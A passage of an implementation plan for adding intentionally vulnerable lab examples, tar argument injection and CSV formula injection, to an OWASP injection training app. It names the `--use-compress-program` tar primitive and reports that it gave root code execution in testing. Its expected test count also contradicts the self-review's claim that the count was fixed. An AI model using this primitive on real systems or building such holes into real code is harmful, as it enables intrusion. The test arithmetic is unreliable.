blind time-based SQLi, error-based SQLi, OS command injection, SQL injection escalating
to remote code execution, stored XSS, XXE file disclosure, XXE SSRF, CSS
attribute-selector data exfiltration via a profile theme),
```
and change it to:
```
**A03 Injection** (SQL injection auth bypass, UNION-based exfiltration, reflected XSS,
blind time-based SQLi, error-based SQLi, OS command injection, SQL injection escalating
to remote code execution, stored XSS, XXE file disclosure, XXE SSRF, CSS
attribute-selector data exfiltration via a profile theme, argument injection via an
unsanitized tar export, and CSV formula injection via comment export),
```

- [ ] **Step 5: Update README.md's category summary table**

Change the A03 row, currently:
```
| A03 Injection | Implemented | SQLi Auth Bypass (Easy), UNION SQLi Exfiltration (Medium), Error-Based SQLi (Medium), Reflected XSS (Medium), Blind Time-Based SQLi (Hard), OS Command Injection (Hard), SQLi to RCE (Hard), Stored XSS (Hard), XXE File Disclosure (Easy), XXE SSRF (Hard), CSS Attribute-Selector Data Exfiltration (Hard) |
```
to:
```
| A03 Injection | Implemented | SQLi Auth Bypass (Easy), UNION SQLi Exfiltration (Medium), Error-Based SQLi (Medium), Reflected XSS (Medium), Blind Time-Based SQLi (Hard), OS Command Injection (Hard), SQLi to RCE (Hard), Stored XSS (Hard), XXE File Disclosure (Easy), XXE SSRF (Hard), CSS Attribute-Selector Data Exfiltration (Hard), Argument Injection via tar Export (Hard), CSV Formula Injection (Medium) |
```

- [ ] **Step 6: Run the full test suite**

Run: `pytest -q`
Expected: `553 passed` (545 + Task 1's 4 new tests + Task 2's 3 new tests = 552 -- **note:** recompute this exactly from Task 1 Step 7's and Task 2 Step 7's actual test counts once they've landed; do not trust this plan's arithmetic blindly if the actual new-test count differs. 545+4+3=552, not 553 -- if you read 553 written anywhere trust the arithmetic here instead).

- [ ] **Step 7: Commit**

```bash
git add tests/test_all_examples_have_hints.py tests/test_hints.py README.md
git commit -m "test(nav): update total/max-score assertions and README for 2 new examples"
```

---

## Self-Review Notes (for the plan author, not an execution step)

**Spec coverage:** both examples from the spec (CSV Formula Injection in a new "CSV Injection" group, Argument Injection in the existing "OS Command Injection" group) are fully covered by Tasks 1 and 2 respectively, including the spec's exact route names, the empirically-verified `--use-compress-program` payload, and the two-route-vs-one-route distinction (Task 1 needs a separate raw CSV-download resource; Task 2 doesn't, since there's no comparable separate action here).

**Placeholder scan:** no TBD/TODO; every step has literal, complete code. One arithmetic slip was caught and fixed during this self-review: Step 6 of Task 3 initially stated "553 passed" while the accompanying parenthetical computed 552 — corrected to state 552 consistently (545 baseline + 4 Task-1 tests + 3 Task-2 tests = 552).

**Type/naming consistency:** `ARGUMENT_INJECTION_PROOF_PATH`, `ARCHIVE_EXPORT_DIR` are each defined once (Task 2 Step 4) and referenced identically everywhere else (template, test, hints). Endpoint names (`a03_injection.csv_injection`, `a03_injection.export_comments_csv`, `a03_injection.export_archive`) match between route decorators, `ExampleNav.endpoint` values, and every `url_for()` call across both tasks' templates. `ExampleNav.endpoint` for both new examples correctly points at an HTML-rendering route, never at the raw `export_comments_csv` download route — Task 1's design deliberately uses two routes specifically to keep this distinction correct from the start (a mistake a prior round made and had to fix after the fact).

**The Orchestration Note's fully-composed order:** independently re-derived from the current `__init__.py`'s actual 20-entry list (read fresh during plan-writing) plus each task's own stated insertion point, and cross-checked against both tasks' own Step 8 test-file edits — consistent throughout (22 total examples, 8 groups, OS Command Injection group's 4th member is `argument-injection-tar-export`, CSV Injection group's sole member is `csv-formula-injection` at the very end).

**Empirical verification carried into the plan:** the `--use-compress-program` payload in Task 2 is not a design guess — it was tested directly against `python:3.12-slim` (this app's actual Docker base image) via `docker run`, producing a real proof-file write with genuine `id` output (`uid=0(root) gid=0(root) groups=0(root)`), before this plan was written. Task 2's implementer should still re-verify this in its own environment (Step 7), but the underlying primitive is already confirmed sound.
